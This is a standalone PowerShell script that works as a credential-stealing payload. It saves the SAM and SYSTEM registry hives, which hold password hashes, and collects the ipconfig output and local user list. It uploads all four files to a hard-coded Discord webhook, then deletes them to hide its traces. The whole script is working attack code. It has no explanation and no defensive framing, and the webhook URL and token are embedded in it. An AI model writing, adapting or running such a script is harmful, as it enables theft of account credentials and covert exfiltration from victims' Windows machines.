cd $env:TMP
ipconfig /all | Out-File -FilePath $env:TMP\ipconfig.txt
net user | Out-File -FilePath $env:TMP\users.txt
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
Upload-Discord -file $env:TMP\sam.save
Upload-Discord -file $env:TMP\system.save
Upload-Discord -file $env:TMP\ipconfig.txt
Upload-Discord -file $env:TMP\users.txt

rm "$env:TMP\sam.save" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\system.save" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\users.txt" -r -Force -ErrorAction SilentlyContinue
